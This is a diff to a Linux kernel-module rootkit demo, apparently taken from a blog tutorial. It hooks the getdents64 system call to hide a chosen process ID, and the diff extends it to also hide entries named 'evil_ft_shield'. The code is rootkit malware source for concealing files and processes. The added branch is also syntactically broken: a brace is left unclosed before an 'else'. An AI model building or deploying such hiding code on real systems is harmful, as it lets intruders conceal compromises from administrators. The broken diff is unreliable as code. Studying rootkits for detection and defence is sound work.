@@ -1,3 +1,4 @@
+// https://www.wiz.io/blog/linux-rootkits-explained-part-2-loadable-kernel-modules#demo-time-56
 #include <linux/sched.h>
 #include <linux/module.h>
 #include <linux/syscalls.h>
@@ -12,6 +13,7 @@
 #endif
 
 #define MODULE_NAME "lkmdemo"
+#define MAGIC_PREFIX "evil_ft_shield"
 
 static int hidden_pid = 0; // PID to hide, passed from userspace
 module_param(hidden_pid, int, 0644);
@@ -65,9 +67,16 @@ static asmlinkage long hacked_getdents64(const struct pt_regs *pt_regs) {
                 continue;
             }
             prev->d_reclen += dir->d_reclen;
-        } else {
-            prev = dir;
         }
+        else if (strcmp(dir->d_name, MAGIC_PREFIX) == 0) {
+            if (dir == kdirent) {
+                ret -= dir->d_reclen;
+                memmove(dir, (void *)dir + dir->d_reclen, ret);
+                continue;
+            }
+            prev->d_reclen += dir->d_reclen;
+        else
+            prev = dir;
 
         off += dir->d_reclen;
     }
